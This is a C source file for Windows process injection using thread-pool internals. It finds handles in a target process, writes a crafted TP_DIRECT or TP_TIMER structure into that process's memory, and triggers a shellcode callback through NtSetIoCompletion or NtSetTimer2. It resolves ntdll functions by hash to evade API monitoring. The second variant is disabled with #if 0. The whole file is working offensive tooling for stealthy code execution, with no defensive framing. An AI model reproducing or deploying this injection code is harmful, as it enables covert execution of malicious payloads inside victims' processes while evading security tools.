#include "pooling.h"
HANDLE getHandle(LPCWSTR objectType, HANDLE hProcess) {
	
	PVOID ntdll_base=LdrModulePeb(ntdll_hash);
	if(!ntdll_base)
	{
		//debug_print("[-] unable to get find kernel32 base\n");
		return;
	}
    ULONG procInfoLen = 0;
    NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcInfo = NULL;
    HANDLE hTargetHandle = NULL;
   // HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    //pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)LdrFunction(ntdll_base, 0xd034fc62);
	
   // pNtQueryObject NtQueryObject = (pNtQueryObject)GetProcAddress(hNtdll, "NtQueryObject");
    pNtQueryObject NtQueryObject = (pNtQueryObject)LdrFunction(ntdll_base, 0x218116f4);

    do {
        if (pProcInfo) {
            free(pProcInfo);
        }
        pProcInfo = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)malloc(procInfoLen);
        if (!pProcInfo) {
            return NULL;
        }

        status = NtQueryInformationProcess(
            hProcess,
            (PROCESSINFOCLASS)ProcessHandleInformation,
            pProcInfo,
            procInfoLen,
            &procInfoLen
        );

    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status)) {
        if (pProcInfo) free(pProcInfo);
        return NULL;
    }

    for (ULONG i = 0; i < pProcInfo->NumberOfHandles; i++) {
        HANDLE candidateHandle = pProcInfo->Handles[i].HandleValue;

        ULONG objectLen = 0;
        PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInfo = NULL;

        if (NtQueryObject(candidateHandle, ObjectTypeInformation, NULL, 0, &objectLen) == STATUS_INFO_LENGTH_MISMATCH) {
            pObjectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)malloc(objectLen);
            if (!pObjectTypeInfo) {
                continue;
            }

            if (NT_SUCCESS(NtQueryObject(candidateHandle, ObjectTypeInformation, pObjectTypeInfo, objectLen, &objectLen))) {
                if (lstrcmpW(objectType, pObjectTypeInfo->TypeName.Buffer) == 0) {
                    hTargetHandle = candidateHandle;
                    free(pObjectTypeInfo);
                    break;
                }
            }

            free(pObjectTypeInfo);
        }
    }

    if (pProcInfo) {
        free(pProcInfo);
    }

    return hTargetHandle;
}


void ExecuteDirectIO(HANDLE hProcess, HANDLE hIoCompletion, PVOID shellcode) {
   //printf("[+] Executing variant 7\n");

    PTP_DIRECT RemoteDirectAddress = NULL;
    TP_DIRECT Direct = { 0 };
    Direct.Callback = shellcode;

    DWORD dwOldProtect = 0;
    NTSTATUS ntError = 0;
	
	
   // HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	
	PVOID ntdll_base=LdrModulePeb(ntdll_hash);
	if(!ntdll_base)
	{
		//debug_print("[-] unable to get find kernel32 base\n");
		return;
	}
    RemoteDirectAddress = (PTP_DIRECT)VirtualAllocEx(hProcess, NULL, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!RemoteDirectAddress) {
        //printf("[!] VirtualAllocEx (RW) failed: %lu\n", GetLastError());
        return;
    }

    if (!WriteProcessMemory(hProcess, RemoteDirectAddress, &Direct, sizeof(TP_DIRECT), NULL)) {
        //printf("[!] WriteProcessMemory (RW) failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, RemoteDirectAddress, 0, MEM_RELEASE);
        return;
    }

    //printf("[+] Created TP_Direct remote memory\n");
   // pNtSetIoCompletion NtSetIoCompletion = (pNtSetIoCompletion)GetProcAddress(hNtdll, "NtSetIoCompletion");
	pNtSetIoCompletion NtSetIoCompletion = (pNtSetIoCompletion)LdrFunction(ntdll_base, 0xa768a9c5);

    ntError = NtSetIoCompletion(hIoCompletion, RemoteDirectAddress, 0, 0, 0);
    if (!NT_SUCCESS(ntError)) {
        //printf("[!] NtSetIoCompletion failed: 0x%08X\n", ntError);
        VirtualFreeEx(hProcess, RemoteDirectAddress, 0, MEM_RELEASE);
        return;
    }

    //printf("[+] Success\n");
}
//variant 8 is not working properly with --redacted--
#if 0
void ExecuteTimerIO(HANDLE hProcess, HANDLE hWorkerFactory, HANDLE hTimer, PVOID shellcode_loader) {
    WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
    DWORD dwOldProtect = 0;
    NTSTATUS ntError = 0;
    PFULL_TP_TIMER pTpTimer = NULL;
    PVOID TpTimerWindowStartLinks = NULL;
    PVOID TpTimerWindowEndLinks = NULL;
    LARGE_INTEGER ulDueTime = { 0 };
    T2_SET_PARAMETERS Parameters = { 0 };

    //HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	PVOID ntdll_base=LdrModulePeb(ntdll_hash);
	if(!ntdll_base)
	{
		//debug_print("[-] unable to get find kernel32 base\n");
		return;
	}
    //pNtQueryInformationWorkerFactory NtQueryInformationWorkerFactory = (pNtQueryInformationWorkerFactory)GetProcAddress(hNtdll, "NtQueryInformationWorkerFactory");
	pNtQueryInformationWorkerFactory NtQueryInformationWorkerFactory = (pNtQueryInformationWorkerFactory)LdrFunction(ntdll_base, 0xb13df075);

   // pNtSetTimer2 NtSetTimer2 = (pNtSetTimer2)GetProcAddress(hNtdll, "NtSetTimer2");
    pNtSetTimer2 NtSetTimer2 = (pNtSetTimer2)LdrFunction(ntdll_base,0x9c2cfc6);

    if (!NtQueryInformationWorkerFactory || !NtSetTimer2) {
        //printf("[!] Failed to resolve NTDLL functions.\n");
        return;
    }

    //printf("[+] Executing variant 8\n");

    //ntError = NtQueryInformationWorkerFactory(hWorkerFactory, 0 /* WorkerFactoryBasicInformation */, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);
    WORKER_FACTORY_BASIC_INFORMATION wfInfo;
    ULONG returnLength = 0;

    ntError = NtQueryInformationWorkerFactory(
        hWorkerFactory,
        WorkerFactoryBasicInformation,
        &WorkerFactoryInformation,
        sizeof(WorkerFactoryInformation),
        &returnLength
    );

    if (ntError != 0) {
        //printf("[!] NtQueryInformationWorkerFactory failed: 0x%X\n", ntError);
        return;
    }

    pTpTimer = (PFULL_TP_TIMER)CreateThreadpoolTimer((PTP_TIMER_CALLBACK)(shellcode_loader),NULL, NULL);
    if (!pTpTimer) {
        //printf("[!] CreateThreadpoolTimer failed.\n");
        return;
    }
    PFULL_TP_TIMER RemoteTpTimerAddress = (PFULL_TP_TIMER)VirtualAllocEx(hProcess, NULL, sizeof(FULL_TP_TIMER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!RemoteTpTimerAddress) {
        //printf("[!] VirtualAllocEx failed.\n");
        return;
    }

    int Timeout = -10000000;
    pTpTimer->Work.CleanupGroupMember.Pool = (TP_POOL*)(WorkerFactoryInformation.StartParameter);
    pTpTimer->DueTime = Timeout;
    pTpTimer->WindowStartLinks.Key = Timeout;
    pTpTimer->WindowEndLinks.Key = Timeout;
    pTpTimer->WindowStartLinks.Children.Flink = &RemoteTpTimerAddress->WindowStartLinks.Children;
    pTpTimer->WindowStartLinks.Children.Blink = &RemoteTpTimerAddress->WindowStartLinks.Children;
    pTpTimer->WindowEndLinks.Children.Flink = &RemoteTpTimerAddress->WindowEndLinks.Children;
    pTpTimer->WindowEndLinks.Children.Blink = &RemoteTpTimerAddress->WindowEndLinks.Children;

    if (!WriteProcessMemory(hProcess, RemoteTpTimerAddress, pTpTimer, sizeof(FULL_TP_TIMER), NULL)) {
        //printf("[!] WriteProcessMemory (Timer struct) failed.\n");
        return;
    }

    TpTimerWindowStartLinks = &RemoteTpTimerAddress->WindowStartLinks;
    if (!WriteProcessMemory(hProcess, &(pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root), (PVOID)&TpTimerWindowStartLinks, sizeof(TpTimerWindowStartLinks), NULL)) {
        //printf("[!] WriteProcessMemory (WindowStartLinks) failed.\n");
        return;
    }

    TpTimerWindowEndLinks = &RemoteTpTimerAddress->WindowEndLinks;
    if (!WriteProcessMemory(hProcess, &(pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root), (PVOID)&TpTimerWindowEndLinks, sizeof(TpTimerWindowEndLinks), NULL)) {
        //printf("[!] WriteProcessMemory (WindowEndLinks) failed.\n");
        return;
    }

    //printf("[+] Created remote TP_TIMER memory\n");

    ulDueTime.QuadPart = Timeout;
    ntError = NtSetTimer2(hTimer, &ulDueTime, 0, &Parameters);
    if (ntError != 0) {
        //printf("[!] NtSetTimer2 failed: 0x%X\n", ntError);
        return;
    }

    //printf("[+] Success\n");
}
#endif